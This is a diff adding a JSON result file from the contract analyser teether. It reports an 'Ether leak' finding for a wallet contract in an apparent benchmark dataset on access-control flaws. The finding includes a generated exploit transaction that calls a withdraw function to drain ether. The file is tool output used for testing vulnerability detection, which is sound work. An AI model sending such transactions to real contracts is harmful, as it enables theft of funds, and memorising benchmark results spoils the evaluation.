@@ -1,0 +1,19 @@
+{
+    "errors": [],
+    "fails": [],
+    "findings": [
+        {
+            "exploit": [
+                "eth.sendTransaction({from:\"0x0000000000000000000000000000000000001234\", data:\"0x2e1a7d4d0000000000000000000000000000000000000000000000016bc75e2d63100003\", to:\"0x4000000000000000000000000000000000000000\", gasPrice:0})"
+            ],
+            "filename": "dataset/access_control/wallet_04_confused_sign.rt.hex",
+            "name": "Ether leak"
+        }
+    ],
+    "infos": [],
+    "parser": {
+        "id": "teether",
+        "mode": "runtime",
+        "version": "2022/11/11"
+    }
+}
